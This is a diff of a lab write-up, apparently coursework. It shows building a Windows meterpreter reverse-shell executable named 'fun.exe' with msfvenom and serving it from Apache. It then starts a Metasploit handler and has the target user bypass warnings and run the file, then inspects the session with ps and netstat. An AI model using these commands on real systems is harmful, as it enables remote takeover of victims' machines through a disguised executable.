@@ -33,11 +33,13 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
 ## OUTPUT
 ![image](https://github.com/user-attachments/assets/b128229a-2a5a-4470-a0ee-668d76225c09)
 
-opy the fun.exe into the apache /var/www/html folder
+Copy the fun.exe into the apache /var/www/html folder
+
 ![image](https://github.com/user-attachments/assets/c39330e6-98df-4d54-b570-7a864dc59237)
 
 
 Start apache server
+
 sudo systemctl apache2 start
 
 ![image](https://github.com/user-attachments/assets/2eca88d8-d02c-4580-a78e-c013c103e081)
@@ -65,6 +67,7 @@ set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST 0.0.0.0
 
 exploit
+
 ![image](https://github.com/user-attachments/assets/8b8c4c66-4e01-466a-ac64-53bf02f16428)
 
 On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
@@ -76,12 +79,15 @@ The file "fun.exe" downloads.
 ![image](https://github.com/user-attachments/assets/14b9b713-ea3f-4f15-b436-fca2928d3a1b)
 
 Bypass any warning boxes, double-click the file, and allow it to run.
+
 ![image](https://github.com/user-attachments/assets/c00ae111-163b-45d3-ba31-40c61ab4129f)
 
 On kali give the command exploit
+
 ![image](https://github.com/user-attachments/assets/73f634ba-42d2-46a3-82eb-ac01f80cda61)
 
 To see a list of processes, at the meterpreter > prompt, execute this command:
+
 ps  ⇒ can see the fun.exe process running with pid 1156
 
 ![image](https://github.com/user-attachments/assets/9338ac5d-3d47-4b7a-8ae2-f790ffa2635f)
@@ -103,6 +109,7 @@ netstat
 A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
 
 Notice the "PID/Program name" value for this connection, which is redacted 
+
 ![image](https://github.com/user-attachments/assets/16afe477-6ef8-412c-8228-72f9c010f937)
 
 
